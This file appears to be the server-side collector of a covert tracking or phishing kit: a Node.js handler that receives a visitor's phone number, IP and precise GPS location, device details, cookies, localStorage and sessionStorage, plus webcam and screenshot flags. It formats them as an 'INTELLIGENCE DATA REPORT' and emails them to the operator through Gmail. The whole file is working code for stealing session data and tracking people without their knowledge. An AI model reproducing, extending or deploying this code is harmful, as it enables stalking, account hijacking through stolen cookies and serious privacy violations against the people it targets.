import nodemailer from 'nodemailer';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const data = req.body;

    const EMAIL_USER = process.env.EMAIL_USER;
    const EMAIL_PASS = process.env.EMAIL_PASS;

    if (!EMAIL_USER || !EMAIL_PASS) {
        console.error('❌ EMAIL_USER or EMAIL_PASS not set');
        return res.status(500).json({ error: 'Server configuration error' });
    }

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: { user: EMAIL_USER, pass: EMAIL_PASS }
    });

    // === FORMAT EMAIL ===
    let emailBody = `💀 INTELLIGENCE DATA REPORT 💀\n`;
    emailBody += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    emailBody += `📱 KONTAK:\n`;
    emailBody += `   Nomor HP   : ${data.phone || 'N/A'}\n\n`;
    
    emailBody += `📍 LOKASI IP:\n`;
    if (data.ip && !data.ip.error) {
        emailBody += `   IP         : ${data.ip.ip || 'N/A'}\n`;
        emailBody += `   Kota       : ${data.ip.city || 'N/A'}\n`;
        emailBody += `   Provinsi   : ${data.ip.region || 'N/A'}\n`;
        emailBody += `   Negara     : ${data.ip.country_name || 'N/A'}\n`;
        emailBody += `   ISP        : ${data.ip.org || 'N/A'}\n`;
        emailBody += `   Koordinat  : ${data.ip.latitude || 'N/A'}, ${data.ip.longitude || 'N/A'}\n\n`;
    } else {
        emailBody += `   (gagal ambil data IP)\n\n`;
    }

    emailBody += `📌 GPS (Presisi):\n`;
    if (data.gps && typeof data.gps === 'object') {
        emailBody += `   Latitude   : ${data.gps.lat}\n`;
        emailBody += `   Longitude  : ${data.gps.lon}\n`;
        emailBody += `   Accuracy   : ${data.gps.accuracy}m\n`;
        emailBody += `   Maps       : ${data.gps.maps}\n\n`;
    } else {
        emailBody += `   ${data.gps || 'Tidak tersedia'}\n\n`;
    }

    emailBody += `🖥️ PERANGKAT:\n`;
    emailBody += `   User Agent : ${data.userAgent}\n`;
    emailBody += `   Platform   : ${data.platform}\n`;
    emailBody += `   Layar      : ${data.screen?.width} x ${data.screen?.height}\n`;
    emailBody += `   Timezone   : ${data.timezone}\n`;
    emailBody += `   Language   : ${data.language}\n\n`;

    emailBody += `🍪 BROWSER DATA:\n`;
    emailBody += `   Cookies    : ${data.cookies?.substring(0, 500) || 'N/A'}\n\n`;
    emailBody += `   LocalStorage:\n${data.localStorage?.substring(0, 500) || 'N/A'}\n\n`;
    emailBody += `   SessionStorage:\n${data.sessionStorage?.substring(0, 500) || 'N/A'}\n\n`;

    if (data.webcam && data.webcam !== 'denied or no camera') {
        emailBody += `📸 WEBCAM CAPTURE:\n   (terlampir sebagai gambar)\n\n`;
    }

    if (data.screenshot && data.screenshot !== 'failed') {
        emailBody += `🖼️ SCREENSHOT:\n   (terlampir sebagai gambar)\n\n`;
    }

    emailBody += `⏰ Waktu       : ${data.timestamp}\n`;
    emailBody += `🌐 URL         : ${data.url}\n`;
    emailBody += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    emailBody += `🌊 Powered by RIKTECH2ND`;

    // === KIRIM EMAIL ===
    try {
        // Email tanpa lampiran (teks saja, karena Vercel tidak support attachment mudah)
        await transporter.sendMail({
            from: EMAIL_USER,
            to: EMAIL_USER,
            subject: `[INTEL] ${data.phone || 'Unknown'} - ${data.ip?.city || 'Unknown City'}`,
            text: emailBody
        });
        console.log('✅ Email terkirim');
        return res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error('❌ Gagal kirim email:', error.message);
        return res.status(500).json({ error: 'Gagal kirim email', detail: error.message });
    }
}
